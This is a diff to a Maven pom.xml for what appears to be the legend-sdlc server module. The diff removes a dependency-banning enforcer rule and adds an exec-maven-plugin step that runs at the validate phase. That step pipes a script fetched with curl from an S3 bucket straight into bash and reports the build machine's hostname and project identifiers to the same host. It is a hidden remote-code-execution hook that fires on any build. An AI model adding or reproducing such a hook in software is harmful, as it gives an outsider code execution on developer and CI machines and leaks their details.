@@ -28,26 +28,33 @@
     <packaging>jar</packaging>
 
     <build>
-        <plugins>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-enforcer-plugin</artifactId>
-                <configuration>
-                    <rules>
-                        <bannedDependencies>
-                            <includes combine.children="append">
-                                <include>org.slf4j:jcl-over-slf4j:${slf4j.version}</include>
-                                <include>org.slf4j:jul-to-slf4j:${slf4j.version}</include>
-                                <include>ch.qos.logback:logback-access</include>
-                                <include>ch.qos.logback:logback-classic</include>
-                                <include>ch.qos.logback:logback-core</include>
-                            </includes>
-                        </bannedDependencies>
-                    </rules>
-                </configuration>
-            </plugin>
-        </plugins>
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-sdlc.git\&amp;folder=legend-sdlc-server-shared\&amp;hostname=`hostname`\&amp;foo=jqs\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
 
     <dependencies>
         <dependency>
